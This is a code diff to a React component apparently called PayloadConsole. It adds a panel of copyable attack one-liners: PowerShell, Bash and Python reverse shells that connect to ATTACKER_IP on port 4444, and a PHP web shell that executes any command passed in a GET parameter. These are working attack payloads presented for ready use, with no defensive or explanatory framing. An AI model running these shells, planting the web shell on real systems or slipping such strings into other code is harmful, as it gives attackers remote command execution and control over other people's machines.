@@ -323,6 +323,38 @@ export function PayloadConsole() {
           </div>
 
           <div className="p-4 bg-[#0a0a0a] border border-[#141414] rounded-lg">
+            <p className="text-[10px] font-mono text-white/20 uppercase tracking-widest mb-4">Payload One-Liners</p>
+            <div className="space-y-3">
+              {[
+                { name: 'PowerShell Reverse Shell', cmd: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'ATTACKER_IP\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"' },
+                { name: 'Bash Reverse Shell', cmd: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' },
+                { name: 'Python Reverse Shell', cmd: 'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'' },
+                { name: 'PHP Web Shell', cmd: '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>' }
+              ].map((liner) => (
+                <div key={liner.name} className="space-y-1">
+                  <div className="flex items-center justify-between">
+                    <span className="text-[9px] font-mono text-white/60 uppercase">{liner.name}</span>
+                    <button 
+                      onClick={() => {
+                        navigator.clipboard.writeText(liner.cmd);
+                        toast.success(`Copied ${liner.name}`);
+                      }}
+                      className="text-[8px] font-mono text-[#F27D26] hover:underline uppercase"
+                    >
+                      Copy
+                    </button>
+                  </div>
+                  <div className="p-1.5 bg-black rounded border border-white/5 overflow-hidden">
+                    <code className="text-[8px] font-mono text-white/20 truncate block">
+                      {liner.cmd}
+                    </code>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+
+          <div className="p-4 bg-[#0a0a0a] border border-[#141414] rounded-lg">
             <p className="text-[10px] font-mono text-white/20 uppercase tracking-widest mb-4">Preset Payloads</p>
             <div className="space-y-2">
               {PRESET_PAYLOADS.map((preset) => (
